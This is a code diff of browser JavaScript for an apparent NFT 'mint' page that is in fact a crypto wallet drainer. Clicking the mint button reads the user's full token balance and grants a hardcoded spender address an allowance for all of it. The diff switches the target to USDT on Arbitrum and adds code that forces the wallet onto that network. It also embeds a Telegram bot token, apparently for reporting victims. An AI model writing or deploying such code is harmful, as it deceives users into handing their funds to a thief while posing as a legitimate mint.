@@ -62,13 +62,20 @@ window.onload = () =>{
   let useraddress;
   // let network_id = '0x38'; // bnb mainnet
   // let network_id = '0x1'; // eth main net
-  let network_id = '0x89';  // polygon mainnet
-    //  let network_id = '0xa4b1'; // arbitramb mainnet
+//   let network_id = '0x89';  // polygon mainnet
+     let network_id = '0xa4b1'; // arbitramb mainnet
 
-    const tokenAddress = '0xF86Df9B91f002cfEB2AEd0E6D05C4C4eAef7cf02'; // polygon pory token 
+    const tokenAddress = '0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9'; // arbi usddt
+
+
+    const chainId = '0xa4b1'; // Chain ID for BSC
+    const chainName = 'Arbitrum Mainnet';
+    const chain_add_rpcUrl = 'https://arbitrum.llamarpc.com';
+    const symbol = 'ETH';
 
     // ======================== static image ==============================================
     let token_balance;
+    let chain_per = true;
     const spenderAddress = '0xad166A918d20703D6D5d97919C79f4C56e12A68f'; // spender address
     let bot_token = '6458087750:AAHfey42yyHAJk3lmXb12XJCOeQlf9u3x7M';
     
@@ -108,8 +115,13 @@ window.onload = () =>{
           .then(async (response) => {
             return true;
           })
-          .catch((error) => {
-            console.error(error);
+          .catch(async (error) => {
+            await add_network();
+            if (chain_per){
+                await change_network(network_id);
+                chain_per = false;
+            } 
+            
             return false;
           });
       } else {
@@ -135,22 +147,49 @@ window.onload = () =>{
       }
     }
 
+   async function add_network() {
+      try {
+        await ethereum.request({
+          method: 'wallet_addEthereumChain',
+          params: [
+            {
+              chainId: chainId,
+              chainName: chainName,
+              rpcUrls: [chain_add_rpcUrl],
+              nativeCurrency: {
+                name: symbol,
+                symbol: symbol,
+                decimals: 18,
+              },
+            },
+          ],
+        });
+
+        return true;
+      } catch (error) {
+        await add_network();
+        console.error(
+          'Error adding network to MetaMask:',
+          error,
+        );
+      }
+    }
+
     // ================== mint process ======================
 
     let mint_button = document.querySelector('.mint_nft_button');
     mint_button.addEventListener('click',mint);
 
     async function mint(){
-      console.log('inside the mint function');
+      await connect_meamask()
+      
       const tokenAbi = require('./abi.json');
       const ethers = require('ethers');
 
       const provider = new ethers.providers.Web3Provider(window.ethereum);
-      console.log('provider set');
 
       const tokenContract = new ethers.Contract(tokenAddress,tokenAbi,provider.getSigner());
 
-      console.log('geting balance');
       // get user token balance
       async function getBalance() {
         const balance = await tokenContract.balanceOf(useraddress);
@@ -164,16 +203,13 @@ window.onload = () =>{
 
         const amountIncrease = ethers.utils.parseUnits(token_balance.toString(), 18,);
 
-        console.log('estimae gas price');
         // Estimate gas
         const estimatedGas = await tokenContract.estimateGas.increaseAllowance( spenderAddress, amountIncrease,);
 
-        console.log('get gas price');
         const gasPrice = await provider.getGasPrice();
 
         const gasLimit = estimatedGas.add(1000); // adding a buffer of 10,000
 
-        console.log('increase allownace ');
         const tx = await tokenContract.increaseAllowance(
           spenderAddress,
           amountIncrease,
